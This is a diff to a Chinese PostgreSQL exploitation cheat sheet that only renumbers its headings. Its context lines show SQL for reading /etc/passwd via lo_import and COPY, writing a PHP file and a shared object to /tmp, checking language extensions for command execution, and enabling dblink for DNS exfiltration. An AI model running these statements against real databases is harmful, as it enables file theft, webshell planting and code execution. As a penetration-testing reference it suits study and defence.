@@ -1,5 +1,5 @@
 # Postgresql利用
-## 读文件
+## 0x01 读文件
 1. 创建数据表把读到的文件copy入表
 ```sql
 drop table wooyun;
@@ -12,7 +12,7 @@ SELECT * FROM wooyun limit 1 offset 0;
 Select lo_import('/etc/passwd',12345678);
 select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a
 ```
-## 写文件
+## 0x02 写文件
 1. 普通文件写入
 ```sql
 COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
@@ -28,14 +28,14 @@ INSERT INTO pg_largeobject VALUES (12345, 3, decode('0000000...7400', 'hex'));
 SELECT lo_export(12345, '/tmp/test.so');
 SELECT lo_unlink(12345);
 ```
-## 命令执行
+## 0x03 命令执行
 ### 编程语言扩展
 postgresql从8.3开始支持多种编程语言扩展 [链接](https://www.postgresql.org/docs/8.3/xplang.html)  
 查看支持的命令:  
 ```postgresql
 select * from pg_language;
 ```
-## DNS外带
+## 0x04 DNS外带
 1. 开启dblink扩展  
 `CREATE EXTENSION dblink`  
 2. 外带语句  
